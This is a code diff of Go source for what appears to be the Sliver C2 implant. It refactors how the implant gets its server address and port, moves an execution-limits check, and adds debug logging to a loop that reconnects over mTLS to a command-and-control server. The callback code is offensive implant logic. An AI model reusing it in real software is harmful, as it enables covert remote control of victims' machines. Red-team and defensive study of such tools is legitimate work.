@@ -40,16 +40,11 @@ var (
 
 	maxErrors = 100 // TODO: Make configurable
 
-	server *string
-	lport  *int
-
 	mtlsLPort         = getDefaultMTLSLPort()
 	reconnectInterval = getReconnectInterval()
 )
 
 func main() {
-
-	limits.ExecLimits()
 
 	// {{if .Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
@@ -65,10 +60,15 @@ func main() {
 	log.Printf("Hello my name is %s", sliverName)
 	// {{end}}
 
+	limits.ExecLimits()
+
 	startConnectionLoop()
 }
 
 func startConnectionLoop() {
+	// {{if .Debug}}
+	log.Printf("Starting connection loop ...")
+	// {{end}}
 	connectionAttempts := 0
 	for connectionAttempts < maxErrors {
 		err := mtlsConnect()
@@ -105,9 +105,9 @@ func startConnectionLoop() {
 // {{if .MTLSServer}}
 func mtlsConnect() error {
 	// {{if .Debug}}
-	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
+	log.Printf("Connecting -> %s:%d", mtlsServer, uint16(mtlsLPort))
 	// {{end}}
-	conn, err := tlsConnect(*server, uint16(*lport))
+	conn, err := tlsConnect(mtlsServer, uint16(mtlsLPort))
 	if err != nil {
 		return err
 	}
